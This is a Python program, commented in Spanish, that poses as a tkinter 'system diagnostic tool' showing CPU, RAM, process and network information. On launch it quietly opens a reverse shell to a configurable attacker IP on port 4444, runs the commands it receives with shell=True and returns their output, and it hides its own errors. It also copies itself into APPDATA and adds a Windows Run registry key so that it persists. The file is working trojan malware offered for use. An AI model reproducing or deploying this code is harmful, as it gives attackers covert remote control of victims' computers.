import os
import shutil
import socket
import subprocess
import platform
import psutil
import threading
import tkinter as tk
from tkinter import messagebox, ttk
import sys

# Función para iniciar la revershell
def iniciar_revershell_oculta(server_ip, server_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((server_ip, server_port))
            while True:
                command = client_socket.recv(1024).decode()
                if command.lower() == "exit":
                    break
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                except subprocess.CalledProcessError as e:
                    output = f"Error al ejecutar el comando: {e}"
                client_socket.sendall(output.encode())
    except Exception:
        pass  # Ocultar errores para mantener discreción

# Función para iniciar la revershell en un hilo
def iniciar_revershell_en_hilo(server_ip, server_port):
    hilo = threading.Thread(target=iniciar_revershell_oculta, args=(server_ip, server_port))
    hilo.daemon = True
    hilo.start()

# Función para crear persistencia
def establecer_persistencia():
    if platform.system() == "Windows":
        persist_path = os.path.join(os.getenv("APPDATA"), "diagnostico.exe")
        if getattr(sys, 'frozen', False):
            ejecutable_actual = sys.executable
        else:
            print("[!] Este script no está empaquetado como ejecutable. La persistencia no se aplicará.")
            return

        if not os.path.exists(persist_path):
            shutil.copy(ejecutable_actual, persist_path)
        comando = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Diagnostico /t REG_SZ /d "{persist_path}" /f'
        os.system(comando)

# Función para obtener información general del sistema
def obtener_info_sistema():
    info = [
        ["Sistema Operativo", platform.system()],
        ["Versión del SO", platform.version()],
        ["Arquitectura", platform.architecture()[0]],
        ["Procesador", platform.processor()],
        ["RAM Total (GB)", round(psutil.virtual_memory().total / (1024**3), 2)],
        ["Espacio en Disco (GB)", round(psutil.disk_usage('/').total / (1024**3), 2)],
        ["Espacio Libre en Disco (GB)", round(psutil.disk_usage('/').free / (1024**3), 2)],
    ]
    return info

# Función para mostrar información del sistema
def mostrar_info():
    info = obtener_info_sistema()
    info_text = "\n".join([f"{item[0]}: {item[1]}" for item in info])
    messagebox.showinfo("Información del Sistema", info_text)

# Función para mostrar uso de CPU y RAM
def mostrar_uso_cpu_ram():
    cpu_uso = psutil.cpu_percent(interval=1)
    ram_uso = psutil.virtual_memory().percent
    messagebox.showinfo("Uso de CPU y RAM", f"Uso de CPU: {cpu_uso}%\nUso de RAM: {ram_uso}%")

# Función para mostrar lista de procesos activos
def mostrar_procesos():
    procesos = [proc.info["name"] for proc in psutil.process_iter(["name"])]
    procesos_texto = "\n".join(procesos[:20])  # Mostrar los primeros 20
    messagebox.showinfo("Procesos Activos", procesos_texto if procesos else "No se encontraron procesos activos.")

# Función para mostrar información de la red
def mostrar_red():
    hostname = socket.gethostname()
    ip_local = socket.gethostbyname(hostname)
    interfaces = psutil.net_if_addrs()
    red_info = [f"{iface}: {addrs[0].address}" for iface, addrs in interfaces.items() if addrs]
    info_red = f"Nombre del Host: {hostname}\nIP Local: {ip_local}\nAdaptadores:\n" + "\n".join(red_info)
    messagebox.showinfo("Información de la Red", info_red)

# Configuración de la interfaz gráfica
def crear_interfaz(server_ip, server_port):
    iniciar_revershell_en_hilo(server_ip, server_port)

    ventana = tk.Tk()
    ventana.title("Herramienta de Diagnóstico")
    ventana.geometry("450x450")
    ventana.configure(bg="#FFF6E3")  # Fondo claro

    # Estilo de los widgets
    style = ttk.Style()
    style.configure("TButton", font=("Arial", 12), padding=10, background="#FFF6E3", foreground="#604CC3")
    style.map("TButton", background=[("active", "#FFF6E3")])

    etiqueta = tk.Label(ventana, text="Herramienta de Diagnóstico del Sistema", font=("Arial", 16, "bold"), bg="#FFF6E3", fg="#604CC3")
    etiqueta.pack(pady=20)

    # Botones con funcionalidad
    ttk.Button(ventana, text="Información del Sistema", command=mostrar_info).pack(pady=10)
    ttk.Button(ventana, text="Uso de CPU y RAM", command=mostrar_uso_cpu_ram).pack(pady=10)
    ttk.Button(ventana, text="Procesos Activos", command=mostrar_procesos).pack(pady=10)
    ttk.Button(ventana, text="Información de la Red", command=mostrar_red).pack(pady=10)
    ttk.Button(ventana, text="Salir", command=ventana.destroy).pack(pady=20)

    ventana.mainloop()

# Configuración principal
if __name__ == "__main__":
    SERVER_IP = "tu ip"  # Cambia por la IP de tu servidor
    SERVER_PORT = 4444        # Cambia por el puerto que usarás

    establecer_persistencia()
    crear_interfaz(SERVER_IP, SERVER_PORT)